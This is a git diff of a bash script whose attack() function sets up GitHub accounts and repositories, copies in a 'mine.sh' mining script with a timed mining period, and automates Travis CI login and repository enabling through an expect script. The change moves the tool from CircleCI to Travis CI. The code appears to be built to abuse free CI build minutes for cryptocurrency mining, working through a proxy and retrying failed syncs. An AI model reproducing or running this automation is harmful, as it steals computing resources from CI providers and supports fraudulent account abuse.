@@ -85,7 +85,7 @@ create_and_config_repository() {
 	git config remote.origin.url \
 		https://$USERNAME:$PASSWORD@github.com/$USERNAME/$REPOSITORY_NAME.git
     echo "Hello World!" > hello.txt
-    cp "$MAIN_DIR/bash_scripts/circle.yml" .
+    cp "$MAIN_DIR/bash_scripts/travis.yml" ./.travis.yml
 
     head -2 "$MAIN_DIR/bash_scripts/mine.sh" > ./temp.sh
     echo "TIME=$MINING_PERIOD_IN_SECONDS" >> temp.sh
@@ -100,11 +100,33 @@ create_and_config_repository() {
     set +e
 }
 
-make_circleci_to_track_repository() {
-    echo "activating circleci"
-    cd "$MAIN_DIR/npm_project"
-    set -e
-    set +e
+make_travisci_to_track_repository() {
+    echo "activating travis ci"
+    cd "$REPOSITORY_DIR"
+
+    expect -c '
+    spawn travis login
+    set prompt ":|#|\\\$"
+    expect "Shell completion not installed. Would you like to install it now? |y|"
+    send "yes\r"
+    expect "Username: "
+    send "'$USERNAME'\r"
+    expect "Password for '$USERNAME': "
+    send "'$PASSWORD'\r"
+    interact -o -nobuffer -re $prompt return
+    '
+
+	travis sync
+	travis_ret_val=$?
+	while [[ $travis_ret_val -ne 0 ]]
+	do
+		sleep 1
+		echo "travis sync failed, retrying ..."
+		travis sync
+		travis_ret_val=$?
+	done
+
+    travis enable -r $USERNAME/$REPOSITORY_NAME
 }
 
 make_commits() {
@@ -129,7 +151,7 @@ attack() {
     wait_for_proxy
     get_github_account
     create_and_config_repository
-    make_circleci_to_track_repository
+    make_travisci_to_track_repository
     make_commits
     print_account_info_for_manual_verification
 }
